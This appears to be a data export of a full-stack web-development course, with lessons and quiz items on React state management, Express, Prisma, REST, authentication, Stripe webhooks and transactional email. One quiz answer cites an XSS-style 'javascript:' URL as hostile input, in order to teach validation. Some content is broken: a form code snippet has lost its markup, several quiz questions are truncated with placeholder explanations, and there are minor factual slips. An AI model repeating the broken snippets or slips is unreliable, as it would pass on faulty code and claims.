weeks.title: State Management at Scale, Beyond useState
weeks.context:
useState works for local component state. When that state needs to be shared across components that are not in a parent-child relationship, props drilling becomes painful: passing state down through three or four layers of components that do not use it themselves, only to pass it further down. State management libraries solve this by providing a store that any component can read from and write to directly.

Zustand is the lightweight state management solution that has largely replaced Redux for new React applications. Where Redux requires actions, reducers, and middleware, Zustand gives you a store in a single function call: useStore(create((set) => ({ count: 0, increment: () => set(state => ({ count: state.count + 1 })) }))). The store is a global singleton. Any component can call useStore(state => state.count) to read the count or useStore(state => state.increment)() to update it, without any Provider wrapping or action dispatching.

The Kanban board you build this week is a complete state management exercise. Board state (columns and their cards) lives in a Zustand store. Multiple components read from and write to the store simultaneously: the column component reads its own cards, the add-card button writes a new card, the drag-and-drop handler updates card positions across columns. No props drilling. Each component takes exactly the slice of state it needs.

Drag and drop is the feature that makes this project feel real. HTML5's native drag-and-drop API handles the browser mechanics. Your job is the state management: when a card is dragged from column A and dropped on column B, you update the store to move the card between columns' card arrays. The immutability requirement means creating new arrays rather than mutating existing ones.

Persistence to localStorage is the layer that makes the data survive page refreshes. Zustand's persist middleware handles this: it subscribes to store updates and writes the state to localStorage on every change. On page load, it rehydrates the store from localStorage before the first render. This one line of middleware gives you persistent state without building any storage logic yourself.

items.title: Orient, what you're building this week
items.body:
## When useState isn't enough
`useState` handles a component's *local* state beautifully, and lifting state up (W5) shares it with nearby components. But this breaks down when state must be shared across components that are *far apart* in the tree, not in a simple parent-child relationship. The pain is **prop drilling**: passing state down through three or four layers of components that *do not use it themselves*, only to pass it further down to the one that does. Threading a `user` or a `theme` or a `cart` through every intermediate component is tedious, error-prone, and clutters components with props they do not care about. This week you learn the tools that solve this, and, more importantly, the *judgement* of which kind of state-management approach fits which *kind* of state, because the biggest insight of the week is that "state" is not one thing.

## The key insight: state comes in categories
The most important idea this week, which most beginners miss and which prevents enormous confusion, is that **there are different *categories* of state, each with a different best tool**, and using one tool for all of them (the common mistake) leads to pain. The main categories:
- **Server state:** data that lives on the server (fetched from an API/database), the user's posts, the product list, the menu. It is *cached* on the client and can become stale. Tool: a data-fetching library like **TanStack Query**.
- **Global client state:** UI state shared app-wide that is *not* from the server, the theme, a sidebar's open/closed, the current user's session info. Tool: a lightweight store like **Zustand**.
- **URL state:** state that belongs in the URL, the current search query, filters, the page number, the active tab. Tool: the URL itself (search params).
- **Form state:** the values and validation of a form being filled out. Tool: a form library like React Hook Form.
- **Local state:** state used by one component. Tool: `useState` (you already have this).
Recognising *which category* a piece of state is, is the skill that determines which tool to reach for.

## Why categorising state is the whole game
Understanding that state has categories, and matching each to its right tool, is the difference between a clean, maintainable app and a tangled one, which is why this framing leads the week. The classic mistake is treating *all* state the same, typically cramming everything (including server data and URL state) into one global store or into component `useState` with heavy prop-drilling, which produces real problems: server data manually fetched and stored in global state gets stale and requires hand-written caching, loading, and error logic (reinventing, badly, what TanStack Query gives you); filter/search state kept in component state instead of the URL means the page is not shareable or bookmarkable and breaks the back button; global state stuffed with things that should be local makes the app hard to reason about. By contrast, when you put *each* kind of state where it belongs, server data in a query library that handles caching/staleness, global UI state in a simple store, URL state in the URL, form state in a form library, local state in `useState`, each tool does what it is designed for, and the whole app becomes simpler and more correct. So this week is less about learning five libraries and more about developing the *judgement* to recognise a piece of state's category and reach for the matching tool, which is a genuinely senior frontend skill. The tools are easy; knowing which to use is the value.

## Where this fits
This week completes the Frontend phase with state management at scale: the categories of state (server, global, URL, form, local) and the right tool for each (TanStack Query, Zustand, the URL, form libraries, `useState`), the architectural judgement that keeps growing apps clean. It builds on React's state (W5) and completes the frontend stack before the Backend phase (W9-12) turns to the server. Today's orientation: state comes in distinct categories, each with a best-fit tool, and the core skill is recognising which category a piece of state is and managing it accordingly, rather than forcing everything into one approach. Tomorrow you dig into the categories.

items.title: Categories of state
items.body:
## The categories of state, in depth
Today you go deeper on *recognising* each category, because correct categorisation is the whole skill. Ask of any piece of state: *where does it really belong?*
- **Server state** (the big one beginners mishandle): is this data that *lives on the server* and you are showing a *copy* of it? The menu, the user's orders, a list of products, anything fetched from an API. The defining trait: it can become **stale** (the server's copy changes), so it needs *caching, refetching, and synchronisation*, not just storage. It is fundamentally different from client state because *you do not own it*, you are caching a remote source of truth.
- **Global client state:** is this UI state, *owned by the client*, that many components share? The theme, whether a modal is open, the sidebar state, ephemeral app-wide UI. It is yours, it does not come from a server, and it does not become "stale", it just needs to be readable/writable from anywhere.
- **URL state:** does this state describe *what the user is looking at* in a way that should be shareable and bookmarkable? Search terms, filters, sort order, pagination, the active tab. If someone copies the URL, should they see the same view? Then it belongs in the URL.
- **Form state:** the in-progress values and validation of a form.
- **Local state:** used by exactly one component (a dropdown's open/closed, a hover state). `useState` is perfect.

## Why server state is the crucial distinction
The single most valuable categorisation to internalise is **server state vs client state**, because conflating them is the most common and most painful mistake. The instinct of a beginner is to treat fetched server data like any other state: fetch it in a `useEffect`, store it in `useState` (or a global store), and manage loading/error flags by hand. This *works* but reinvents, poorly, a whole set of hard problems that server data has and client state does not: *caching* (don't refetch what you already have), *staleness* (the server's data changed, yours is now wrong), *refetching* (when should you get fresh data? on focus? on interval?), *deduplication* (two components want the same data, fetch once), *loading and error states* (handled consistently), and *optimistic updates*. Server state is genuinely different because it is a *cached copy of a remote source of truth that drifts out of date*, and managing that drift is exactly what dedicated tools (TanStack Query, tomorrow) are built for. Recognising "this is server state, so it needs a server-state tool, not `useState`" is the realisation that eliminates a huge amount of buggy, hand-rolled fetching-and-caching code. Most "my data is stale / I'm fetching the same thing five times / my loading states are a mess" problems are *server state being managed as if it were client state*, and the fix is categorising correctly.

## The discipline: identify the category first
The practical workflow this insight produces is to **identify a piece of state's category *before* choosing how to manage it**, which is a small habit with large payoff. When you have some state, pause and ask: Is it from the server (-> query library)? Is it global client UI (-> store)? Does it belong in the URL (-> search params)? Is it a form (-> form library)? Is it local to one component (-> `useState`)? Answering that *first* tells you the right tool, and prevents the default mistakes (everything in global state, server data in `useState`, filters not in the URL). This categorisation discipline keeps an app's state architecture clean as it grows, because each kind of state lives where it should and is managed by the tool designed for it, rather than everything accreting into one overstuffed global store or scattered ad-hoc fetching. It is the same "match the tool to the problem" judgement that runs through every track, applied to the specific and frequently-muddled domain of frontend state. The libraries you learn this week (TanStack Query, Zustand, etc.) are each *easy*; the skill that makes you effective is the categorisation that tells you when to use which. Master the categories, and state management stops being the confusing mess it is for most developers and becomes a series of clear, right-tool-for-the-job decisions.

## Where this fits
You can categorise state, server (cached remote data that goes stale), global client (shared UI state you own), URL (shareable/bookmarkable view state), form, and local, with server-vs-client as the crucial distinction, and you have the discipline to identify the category *first* and then pick the matching tool. Tomorrow you learn the tool for the most-mishandled category: TanStack Query for server state.

items.title: URL state
items.body:
## URL state: the address bar is state
Some state belongs not in React at all, but in the **URL**. Search queries, filters, sort order, pagination, the active tab, anything that describes *what the user is currently viewing*, should live in the URL's **search params** (`?category=cold&sort=price`), because the URL is shared, bookmarkable, and tied to the browser's history. Instead of `useState` for the active filter, you read and write it from the URL:
```jsx
// Next.js: read and update URL search params
const searchParams = useSearchParams();
const category = searchParams.get('category') ?? 'all';   // state FROM the URL
// to change it, navigate to a new URL with the updated param
router.push(`?category=${newCategory}`);
```
Now the filter is *in the URL*: `/menu?category=cold` shows cold drinks, and that URL captures the view.

## Why these things belong in the URL
The reason filters, search, and pagination belong in the URL rather than component state is a set of concrete, important UX properties that you *lose* if you keep them in `useState`:
- **Shareable:** a user can copy the URL (`/menu?category=cold&sort=price`) and send it, and the recipient sees the *exact same view*. With the state in `useState`, the URL is just `/menu` and the filtered view cannot be shared, a real loss for any filterable/searchable interface.
- **Bookmarkable:** the user can bookmark the filtered/searched view and return to it. `useState` state is gone on reload; URL state persists.
- **Back/forward works:** because the state is in the URL, the browser's back button correctly returns to the previous filter/page, and forward works too. With `useState`, the back button does *not* undo a filter change (it leaves the page entirely), which violates user expectations, a classic bug where "back" does the wrong thing because the view state was not in the URL.
- **Refresh-safe:** reloading the page keeps the view (the URL still has the params), where `useState` resets to default on reload.
These properties, shareable, bookmarkable, back-button-correct, refresh-safe, are exactly what users expect from search and filters, and the *only* way to get them is to put that state in the URL. So the rule is firm: **if state describes a shareable/navigable view, it belongs in the URL.**

## The principle: the URL is part of your app's state
The deeper idea is that **the URL is a legitimate, important place to store state**, not just an address, and treating it as such is a mark of thoughtful frontend architecture. Many developers default to `useState` for *everything* about the current view, and then bolt on hacks when users complain that sharing a link does not work or the back button is broken, whereas the right design is to recognise from the start that view-describing state (what is searched, filtered, sorted, paged, selected) *is* URL state and put it there. This has a nice consequence: the URL becomes a *complete description* of what the user is looking at, so the app's view is fully determined by the URL (plus the server data), which is clean, predictable, and gives you all the shareable/bookmarkable/navigable behaviour for free from the browser. It also composes with the rest: server state (TanStack Query) often *depends* on URL state (the search query in the URL drives the query that fetches results), a natural and powerful pairing where the URL holds *what* to show and TanStack Query fetches it. Recognising URL state as a category, and deliberately putting view-state in the URL rather than reflexively in `useState`, is a specific, high-value piece of the state-categorisation judgement, and it directly produces the shareable, navigable, back-button-correct behaviour that distinguishes a polished app from a frustrating one. The address bar is state; use it.

## Where this fits
You understand URL state: view-describing state (search, filters, sort, pagination, active tab) belongs in the URL's search params, which makes it shareable, bookmarkable, back-button-correct, and refresh-safe, properties `useState` cannot give, and the URL becomes a complete description of the current view, pairing naturally with server-state fetching. Tomorrow you handle the form-state category with a dedicated form library.

items.title: Form state
items.body:
## Form state: a dedicated tool for a common need Forms are everywhere and have their own kind of state, the field values, validation errors, touched/dirty status, submission state, and managing all that with raw `useState` (a piece of state and an onChange per field, plus manual validation) gets verbose and error-prone for anything beyond a trivial form. **React Hook Form** (the standard) is the dedicated tool, handling form state efficiently with minimal boilerplate: ```jsx const { register, handleSubmit, formState: { errors } } = useForm(); function onSubmit(data) { /* data = all field values, already collected */ } return (
{errors.email && {errors.email.message}}
); ``` `register` wires each input into the form's state, `handleSubmit` collects all the values and runs your handler, and validation rules (and their error messages) are declared inline, all the form plumbing, handled. ## What a form library handles for you A form library earns its place by handling the genuinely-tedious parts of forms that raw `useState` makes you write by hand: - **Field registration and values:** `register` connects inputs to the form state, so you do not write a `useState` + `onChange` per field, the library tracks all values. - **Validation:** declare rules per field (required, format, min/max, custom), and get error messages and validity, instead of hand-writing validation logic and error state. It integrates with schema validators (like Zod) for typed, reusable validation shared with the backend. - **Submission handling:** `handleSubmit` collects values, runs validation, and calls your handler only with valid data, handling the prevent-default and value-gathering for you. - **Field state:** which fields are touched, dirty, or in error, so you can show errors only after a field is touched, disable submit until valid, etc. - **Performance:** React Hook Form is optimised to minimise re-renders (it uses uncontrolled inputs under the hood with refs), so large forms stay fast where many controlled `useState` fields would re-render heavily. For any non-trivial form, this is a large reduction in code *and* an increase in correctness (consistent validation, proper error display), which is why a form library is the standard for real forms. ## When a library, and when raw React is fine The judgement, consistent with the week's theme, is to match the tool to the form's complexity, not reach for the library reflexively *nor* hand-roll a complex form. **Raw `useState` controlled inputs** (W5) are perfectly fine for a *simple* form, one or two fields, minimal validation, where the library would be unnecessary overhead, and it is good that you understand the controlled-component fundamentals the library is built on. **A form library** (React Hook Form) is the right call for *real* forms, multiple fields, meaningful validation, error handling, where its boilerplate reduction and built-in validation/error/submission handling pay off clearly. The signal to reach for it: you find yourself writing repetitive `useState`+`onChange`+validation+error-state code per field, that repetition *is* what the library eliminates. This is the same "use the dedicated tool when the problem warrants it, raw approach when it is simple" judgement as everywhere else, applied to form state. Recognising form state as its own category with a dedicated best-fit tool (for non-trivial cases) completes another piece of the state-categorisation picture: forms are not just "a bunch of useState", they are a distinct concern with a tool designed for it, and using that tool for real forms keeps your form code clean, correct, and consistent. For Bean Forge's simple contact form, controlled `useState` is fine; for a multi-step signup or a complex settings form, React Hook Form is the right tool. ## Where this fits You understand form state as its own category: managed cleanly by a dedicated library (React Hook Form) that handles field registration, validation, errors, submission, and performance with minimal boilerplate, used for real forms while raw controlled `useState` suffices for simple ones. Tomorrow you go deeper on the subtleties of server-state freshness: stale time, cache time, and refetching.

days.summary: Focus: Stale time, cache time, refetch on focus

items.title: Stale time, cache time, refetch on focus
items.body:
## Tuning server-state freshness
TanStack Query manages server data's freshness automatically, but *how fresh* and *how often to refetch* are tunable, and understanding the key settings, **stale time**, **cache time**, and **refetch-on-focus**, lets you balance data freshness against unnecessary requests. The core settings:
```jsx
useQuery({
  queryKey: ['menu'],
  queryFn: fetchMenu,
  staleTime: 60_000,          // data is "fresh" for 60s; won't refetch within that
  gcTime: 300_000,            // keep unused cached data for 5 min before discarding
  refetchOnWindowFocus: true, // refetch when the user returns to the tab
});
```
These control the trade-off between always-fresh data (more requests) and fewer requests (possibly slightly stale data), and tuning them appropriately for each kind of data is a real optimisation.

## What each setting does, and the trade-off
Understanding these three settings clarifies how server-state caching actually behaves:
- **`staleTime`** (how long data is considered *fresh*): within the stale time, TanStack Query serves the cached data *without* refetching (it trusts it is current); after the stale time, the data is "stale" and will be refetched in the background on the next trigger (mount, focus). A *longer* stale time means fewer refetches (good for data that rarely changes, a list of countries) but a higher chance of showing slightly out-of-date data; a *shorter* stale time means fresher data but more requests. You set it per the data's volatility: long for stable data, short (or zero) for rapidly-changing data.
- **`gcTime`** (garbage-collection / cache time): how long to keep *unused* cached data (data no component is currently using) before discarding it. A longer cache time means returning to a screen shows instant cached data even after being away a while; shorter frees memory sooner. It is about how long the cache *persists*, distinct from how long data is considered *fresh*.
- **`refetchOnWindowFocus`** (refetch when the user returns to the tab): on by default, and usually desirable, when a user switches back to your app, refetch potentially-stale data so they see current information. You might disable it for data that does not need such freshness, to avoid extra requests.
The unifying trade-off is **freshness vs request count**: tighter settings keep data more current at the cost of more network requests (and load), looser settings reduce requests at the cost of potential staleness, and the right balance *depends on the data*.

## Matching freshness to the data: the real skill
The practical skill, and the deeper lesson, is **matching the freshness settings to how volatile and how critical each kind of data is**, rather than using one setting for everything. Different server data has different freshness needs: a user's account balance or a live inventory count should be very fresh (short stale time, refetch on focus), because showing stale values there is harmful; a list of blog categories or a product catalog changes rarely, so a long stale time avoids needless refetches with no real downside; a dashboard might refetch on an interval. Using a single global setting ignores this, either over-fetching stable data (wasteful) or under-fetching volatile data (showing stale values). So you *tune per query* based on the data's nature: how often does it really change, and how bad is it to show a slightly old value? This is a nuanced, real-world optimisation that balances user-perceived freshness, network/server load, and cost, and it is the kind of detail that separates a thoughtfully-built data layer from a naive one. It also reflects the broader truth from this whole week: even *within* the server-state category, good management means understanding the specific data and configuring the tool to match it, not applying one setting blindly. TanStack Query gives you sensible defaults (so you need not tune everything), but knowing *what* staleTime, gcTime, and refetch-on-focus do lets you deliberately tune the freshness-vs-requests trade-off where it matters, which is the mark of someone who understands server-state caching rather than just using it. Match the freshness to the data.

## Where this fits
You can tune server-state freshness: `staleTime` (how long data is fresh before refetching), `gcTime` (how long unused cache persists), and `refetchOnWindowFocus`, understanding the freshness-vs-request-count trade-off and the skill of matching it to each data's volatility and criticality. This completes your command of server state. Tomorrow you assemble the week's state-management knowledge and ship.

items.title: Ship it
items.body:
## Ship it: a well-architected state layer
You assemble the week into an app (or a feature) with a clean, correctly-categorised state architecture, demonstrating the judgement that is the week's real lesson:
- **server state** via TanStack Query (cached, deduplicated, with appropriate freshness settings).
- **global client state** via a lightweight store (Zustand) where state is genuinely shared app-wide.
- **URL state** for filters/search/pagination (shareable, bookmarkable, back-button-correct).
- **form state** via a form library for real forms, and **local state** via `useState` where appropriate.
```bash
git add . && git commit -m "State architecture: server (TanStack Query), global (Zustand), URL, form, local - each in its place"
git push
```

## The deliverable is the *architecture*, the right tool per category
What makes this project demonstrate real frontend competence is that *each kind of state is managed by the right tool*, which is a senior-level architectural decision most developers get wrong. The strongest version shows clear, deliberate categorisation: server data is in TanStack Query (not hand-fetched into `useState`), filters and search are in the URL (so views are shareable and the back button works), genuinely-global UI state is in a small store (not prop-drilled through ten components), forms use a form library where warranted, and local state stays local. The proof is in what *works* as a result: data is fresh and not redundantly fetched, filtered views are shareable links, the back button behaves correctly, and the codebase has no prop-drilling tangle or stale-data bugs, all consequences of putting each state in its proper place. Being able to look at a piece of state and *correctly categorise it* (this is server state, this belongs in the URL, this is truly global, this is local) and reach for the matching tool is exactly the judgement that distinguishes a well-architected app from a tangled one, and it is the deliverable. Anyone can use the libraries; using the *right one for each category* is the skill.

## What state management established, and the frontend phase
Step back: you have learned the architecture of frontend state, which is one of the most confusing areas for developers and one where good judgement has outsized impact. The core lesson is *categorisation*: state is not one thing but several kinds, server (TanStack Query, with freshness tuning), global client (a store), URL (the address bar), form (a form library), and local (`useState`), and the skill is recognising which category a piece of state is and managing it with the right tool, rather than forcing everything into one approach. This judgement keeps apps clean as they scale and eliminates whole classes of bugs (stale data, broken back buttons, prop-drilling messes, inconsistent loading states). And it completes the **Frontend phase**: you can now build interfaces (React's component model and declarative state), take them to production (Next.js App Router's server/client architecture), style them beautifully and accessibly (Tailwind, shadcn/Radix, tasteful motion), and architect their state correctly (the right tool per category). That is the complete modern frontend skill set, the one most frontend and full-stack jobs require, and it is FORGE's own stack throughout.

## Where this fits
You shipped an app with a correctly-categorised state architecture (server, global, URL, form, local, each in its proper tool), completing the Frontend phase and the senior judgement of matching state to the right management approach. You now command modern frontend end to end. Next comes the **Backend phase** (W9-12), where you turn to the server side, Node.js and Express, PostgreSQL and Prisma, REST API design, and authentication, building the server, database, and APIs that your frontends consume, which makes you a true *full-stack* developer.

weeks.title: Node.js, Express, and the Server Side of JavaScript
weeks.context:
The browser runs JavaScript. The server is separate, a different process, often on a different machine, that receives HTTP requests and sends responses. Node.js lets you write server-side JavaScript with the same language you use in the browser, but the environment is completely different: no window object, no DOM, no localStorage. Instead, you have access to the filesystem, environment variables, databases, and the ability to listen for incoming HTTP requests.

Express is the minimal web framework for Node.js. Where Next.js is opinionated and full-featured, Express is a thin layer over Node's HTTP server that adds middleware (functions that process requests and responses), routing (mapping URLs to handler functions), and nothing else. Understanding Express means understanding how web servers work at the HTTP level, without framework magic hiding the details.

The URL shortener you build has one real engineering challenge: generating short codes. A 7-character alphanumeric code from a 62-character alphabet (a-z, A-Z, 0-9) gives 62^7 = 3.5 trillion possibilities, more than enough. But the codes must be unique. The two approaches are random generation with collision checking (generate a code, check if it exists in the database, retry if it does) and counter-based encoding (encode the auto-incrementing row ID as base62). The counter approach is simpler and has no collision risk.

TypeScript on the server is the same TypeScript you use in the browser, the same type system, the same compiler, but the types describe server-specific things: request bodies, response schemas, database row types. Defining these types explicitly catches entire categories of bugs before they reach production. A handler that expects req.body.url to be a string and receives undefined instead will throw a runtime error. A TypeScript type catching that discrepancy catches it at compile time.

The redirect endpoint is the product. When someone visits your short URL (e.g., short.ly/abc1234), your server looks up the code in the database, increments the click count, and responds with an HTTP 301 redirect to the original URL. The browser follows the redirect transparently. The entire user experience is seamless, they just end up at the destination.

items.title: Prove you understood it
items.body: Your Express route POST /shorten receives a JSON body with a url field. You call req.body.url without any validation. What risks does this create and how do you address them? (1) req.body.url might be undefined (request body is malformed or the field is missing), causing a runtime error when you try to use it. (2) It might be a string but not a valid URL (e.g., "javascript:alert('xss')", a protocol that can execute code when used as a redirect target). (3) It might be a very long string that overloads your database. Fix: use Zod or express-validator to parse and validate the request body before using it. Check that url is a string, parse it with new URL(url) to verify it is a valid URL, check the protocol is http or https, and enforce a maximum length.

weeks.title: PostgreSQL, Prisma, and Designing Data You Won't Regret
weeks.context:
SQLite was right for getting started, zero configuration, single file, no server to manage. But it has real limits: no concurrent writes (only one writer at a time), no network access (the database must be on the same machine as the application), and limited tooling for production management. PostgreSQL is the production database that most web applications use. This week you migrate your URL shortener from SQLite to PostgreSQL and add Prisma as the ORM.

Prisma is an ORM (Object-Relational Mapper) that provides three things: a type-safe query client, a schema definition language, and a migration system. The schema (schema.prisma) is the single source of truth for your database structure. Prisma generates TypeScript types from it and generates migration SQL from it. When you add a field, you add it to the schema and Prisma generates the ALTER TABLE migration. You never write migration SQL by hand.

Database design deserves more attention than most beginners give it. The decisions you make now, table names, column types, nullability, foreign key constraints, indexes, are hard to change after the application is running with real data. The URL shortener has two main entities: Url (the link record with short code and original URL) and Click (each redirect event). The relationship is one-to-many: one URL has many clicks. How you model this relationship, what indexes you create, and how you handle deletion cascades all affect query performance and data integrity.

Prisma migrations are the mechanism that applies schema changes to the database safely. In development, prisma migrate dev generates and applies a new migration. In production, prisma migrate deploy applies pending migrations without prompting. The migration history is stored in the prisma/migrations directory and committed to git, this is the database's version history, analogous to git commits for code.

Connection pooling is the production concern that SQLite never required. PostgreSQL connections are expensive, establishing a new connection takes 50-100ms. An application that creates a new connection per request cannot handle significant traffic. Prisma manages a connection pool automatically, reusing connections across requests. The pool size is configurable: too small and requests queue waiting for a connection, too large and you hit PostgreSQL's maximum connections limit.

items.body: You add a userId field to your Url model but mark it as optional (userId Int?). Later you decide every URL must have a user and change it to required (userId Int). Why can you not just change the schema and run a migration without extra steps? The migration would add a NOT NULL constraint to a column that already has NULL values (existing URLs created before auth was added). PostgreSQL rejects NOT NULL constraints on columns with existing NULL values. You must first fill in the NULL values, either by adding a default value (userId Int @default(1)), writing a migration that updates existing rows with a placeholder user ID, or accepting a two-step migration: add a temporary default, apply the constraint, remove the default. weeks.title: REST API Design, Endpoints People Don't Hate
weeks.context:
REST is not a technology, it is a set of constraints on how you use HTTP. The word "RESTful" is widely abused. What it actually means in practice: your API uses nouns (resources) not verbs in URLs, HTTP methods carry the semantic meaning of the operation, and responses use standard HTTP status codes so clients do not have to parse error messages to know what happened.

URL design: use plural nouns for collections (/users, /orders, /products). Use the pattern /resource/:id for individual items. Nest sub-resources when the relationship is ownership: /users/:id/orders means the orders that belong to a specific user. Do not nest more than two levels deep, it becomes unwieldy. Avoid verbs in URLs: /users/:id/delete is wrong; DELETE /users/:id is correct. The method IS the verb.

HTTP methods and their contracts. GET is safe (reading does not change state) and idempotent (calling it twice has the same effect as calling it once). PUT replaces an entire resource, sending PUT /users/1 with a partial body should fail or overwrite missing fields with null. PATCH updates specific fields only. POST creates a new resource or triggers an action; it is neither safe nor idempotent. DELETE is idempotent, deleting a resource that does not exist should return 404 or 204, but a second DELETE should not crash.

Status codes. 200 OK, 201 Created (after a successful POST), 204 No Content (success with no response body, common for DELETE). 400 Bad Request (malformed request body), 401 Unauthorized (not authenticated), 403 Forbidden (authenticated but not allowed), 404 Not Found, 409 Conflict (duplicate email on registration), 422 Unprocessable Entity (valid JSON but failed validation). 500 Internal Server Error (something broke on the server). Never return 200 with an error message in the body, that makes your API a lie.

This week you design and build the full REST API for Bean Forge: CRUD endpoints for menu items, orders, and customers. You write an OpenAPI spec for it. You use zod for request validation so bad input never reaches your database.

weeks.title: Authentication and Authorization, Done Right
weeks.context:
Authentication is about identity: who are you? Authorisation is about permission: what are you allowed to do? These are different systems and conflating them causes security holes. This week you build both correctly for Bean Forge, and you understand the tradeoffs between the two main approaches: sessions and JWTs.

Sessions: when a user logs in, you create a server-side session record (stored in a database or Redis) and set a session ID in an HttpOnly cookie. On every subsequent request, the browser sends the cookie, you look up the session, and you know who the user is. Sessions are easy to invalidate: delete the record. The cookie is HttpOnly so JavaScript cannot read it, preventing XSS token theft. The downside: every request hits the database. For most apps, this is fine.

JWTs (JSON Web Tokens): you sign a payload (user ID, roles, expiry) with a secret key and send the token to the client. The client stores it and sends it with every request. You verify the signature without hitting the database, stateless. The downside: you cannot invalidate a JWT until it expires. If a user's permissions change or their account is compromised, the old token keeps working until expiry. Workarounds exist (blocklist, short expiry + refresh tokens) but they add complexity. Use sessions unless you have a specific reason for JWTs (microservices, third-party clients).

Password storage: hash with bcrypt or argon2. Never store plain text. Never use MD5 or SHA-1 for passwords, these are fast hashing algorithms and can be brute-forced. Bcrypt is deliberately slow. The cost factor (work factor) controls how slow, a cost factor of 12 means 2^12 iterations. Always hash on the server, never trust a hash sent from the client.

OAuth 2.0: the protocol that powers "Sign in with Google." The user is redirected to Google, they grant permission, Google redirects back with an authorization code, your server exchanges the code for tokens using a back-channel request. The key security feature: the client secret never leaves your server. PKCE (Proof Key for Code Exchange) prevents code interception attacks when the redirect target is a public client (like a mobile app or SPA) that cannot keep a client secret.

This week: add email/password auth to Bean Forge with sessions. Add "Sign in with Google" using NextAuth or a manual OAuth implementation. Protect routes with middleware that checks for a valid session.

items.title: Prove you understood it
items.body: A user logs in and you create a session. Two hours later, the user's account is suspended by an admin. The user still has their session cookie. What happens on their next request, and how do you handle it? The session lookup finds the session record in the database. But before trusting it, you must re-fetch the user from the database to check their current status. If you only store the user object in the session at login time, you will not see the suspension until the session expires. The correct approach: store only the userId in the session, fetch the user on every request (or cache with short TTL), and check the active/suspended status.

weeks.title: Payments with Stripe, The Easy Way to Lose All Your Money
weeks.context:
Stripe is the standard for online payments because it handles the hard parts: PCI compliance, fraud detection, 3D Secure, global payment methods, tax calculation. Your job is to integrate it correctly, and "correctly" means understanding that webhooks, not API responses, are the source of truth.

Stripe primitives. A Customer is a Stripe object that represents a paying user, attach your user's database ID to the Stripe customer for lookups. A Product is what you sell (a SaaS plan, a physical item). A Price is how you sell it, attached to a Product, can be recurring (subscription) or one-time. A PaymentIntent represents an attempt to collect payment, it has a status lifecycle (requires_payment_method, requires_confirmation, processing, succeeded, canceled). A Subscription links a Customer to a Price with a billing cycle.

Checkout vs Elements. Stripe Checkout is a hosted payment page, Stripe renders the UI, handles card number entry, validation, and 3D Secure. Use Checkout for most apps: it is the fastest path to PCI compliance because card numbers never touch your server. Stripe Elements is a set of embeddable UI components, you control the layout, Stripe handles the secure input fields. Use Elements when you need a custom checkout experience (your design team will not accept the Stripe-hosted page).

Webhooks are the source of truth. When a user completes payment, Stripe fires a webhook to your server. You must handle these events and update your database accordingly, do not update the database based on the API response from your server-side checkout creation call, because the user might close the browser before the success page loads. The events you care about: checkout.session.completed, customer.subscription.created, customer.subscription.updated, customer.subscription.deleted, invoice.payment_succeeded, invoice.payment_failed. Verify webhook signatures using Stripe's library, reject any request that does not have a valid signature.

This week you add a subscription to Bean Forge. Users can subscribe to "Bean Forge Pro" for a monthly fee. You create the Stripe checkout session, handle the success/cancel redirects, and process webhooks to grant/revoke Pro status in your database.

concept_check.q: A user pays successfully, the Stripe Checkout redirect sends them to your /success page, and your success page marks them as Pro. What is the failure mode here? If the user closes the browser immediat?
concept_check.explain: See the lesson for explanation. The right answer follows directly from the core idea taught today.

concept_check.q: Your webhook endpoint is receiving events. How do you verify that the request actually came from Stripe and is not a forged request from an attacker? Use stripe.webhooks.constructEvent(rawBody, signat?
concept_check.explain: See the lesson for explanation. The right answer follows directly from the core idea taught today.

concept_check.q: A user's subscription is cancelled. What events does Stripe fire, and when does access end? When a subscription is cancelled, Stripe fires customer.subscription.updated with status "active" and cancel?
concept_check.explain: See the lesson for explanation. The right answer follows directly from the core idea taught today.

items.title: Prove you understood it
items.body: A user pays successfully, the Stripe Checkout redirect sends them to your /success page, and your success page marks them as Pro. What is the failure mode here? If the user closes the browser immediately after payment but before the redirect fires, your success page never loads, and the user is never marked as Pro. Stripe received the payment; your database does not know. The fix: never update the database based on a redirect. Instead, handle the checkout.session.completed webhook. Webhooks are server-to-server, they do not depend on the user's browser.

weeks.title: Email, Transactional, Marketing, and Why Your Inbox Hates You
weeks.context:
Email is infrastructure. When a user signs up, forgets their password, makes a purchase, or triggers any significant event, your application sends email. Getting email right means understanding the difference between transactional email and marketing email, the infrastructure that determines whether your message reaches the inbox, and the regulations that govern what you can send.

Transactional email is triggered by user action: welcome email, password reset, order confirmation, invoice. The user expects it. Send it from a transactional email provider: Resend, Postmark, or AWS SES. These providers optimise for deliverability on triggered, one-to-one messages.

Marketing email is bulk: newsletters, product announcements, promotional campaigns. Use a marketing email provider: Loops (good for SaaS), Mailchimp, or ConvertKit. The distinction matters because bulk email and transactional email have different sending patterns, ISPs treat them differently. Mixing them harms your transactional deliverability.

Deliverability: the science of getting email into the inbox. The three DNS records you must configure. SPF (Sender Policy Framework): a TXT record that lists the mail servers authorised to send email from your domain. Prevents strangers from sending email that appears to come from you. DKIM (DomainKeys Identified Mail): your email provider generates a key pair. You publish the public key as a DNS TXT record. The provider signs outgoing emails with the private key. Recipients verify the signature. Proves the email was not altered in transit. DMARC (Domain-based Message Authentication, Reporting, and Conformance): a policy that tells receiving servers what to do with email that fails SPF and DKIM checks, reject it, quarantine it, or report it. Start with p=none (report only), move to p=quarantine, then p=reject.

Regulations. CAN-SPAM (US): all commercial email must include a physical mailing address and an unsubscribe link. The unsubscribe must work within 10 business days. GDPR (EU): you need consent to send marketing email to EU residents. Pre-ticked checkboxes do not count. Keep a record of when and how consent was given.

This week you add transactional email to Bean Forge: welcome email on signup, password reset flow (token generation, email dispatch, token verification), and order confirmation.

items.title: Zero-cost path (free alternatives)
items.body:
## Zero-cost path (no credit card required)

This week mentions industry-standard tools that can cost money. You can complete every step for free, with no card and no trial that auto-renews:

- **AWS**, use **LocalStack** (mocks AWS APIs on your laptop) plus **MinIO** (local S3). The CLI commands are the same; set `--endpoint-url=http://localhost:4566`. No AWS account or card required.
- **Email / SMS**, capture mail locally with **Mailpit** / **MailHog** for learning (free).

Learn the concept with the free tool; the paid service is only how some teams run it in production. The skills and the code are the same.

items.title: Prove you understood it
items.body: You send a password reset email with a token. The email contains a link to /reset-password?token=abc123. How do you implement this securely? Generate the token with crypto.randomBytes(32).toString('hex'). Hash it before storing in the database (use SHA-256, it does not need to be bcrypt because password reset tokens are long-lived and random, not user-chosen). Store the hash, the userId it belongs to, and an expiry (15 minutes from now). Send the raw token in the email link. When the user clicks the link, hash the token from the URL, look up the hash in the database, verify it has not expired, then allow the password reset and delete the token. The reason you store the hash: if your database is breached, the attacker cannot use the stored tokens to reset passwords.

